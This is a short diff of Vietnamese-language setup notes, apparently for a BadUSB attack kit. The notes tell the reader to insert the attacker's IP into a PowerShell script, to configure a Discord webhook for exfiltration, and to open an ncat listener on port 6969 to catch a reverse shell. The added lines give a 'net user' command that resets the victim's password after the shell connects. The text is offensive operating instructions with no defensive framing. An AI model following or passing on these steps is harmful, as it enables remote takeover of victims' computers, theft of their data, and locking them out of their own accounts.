@@ -1,3 +1,6 @@
 Đổi ip ngay đầu thành ip máy của attacker
 Đổi link github ($hookurl) (Tìm hiểu discord webhook)
 Cài netcat trên máy attacker và dùng lệnh ncat -lvnp 6969 (6969 là Port đã cài sẵn trong ps1)
+
+Lệnh đổi mật khẩu ng dùng sau reverse shell
+net user $env:USERNAME badusb@2025
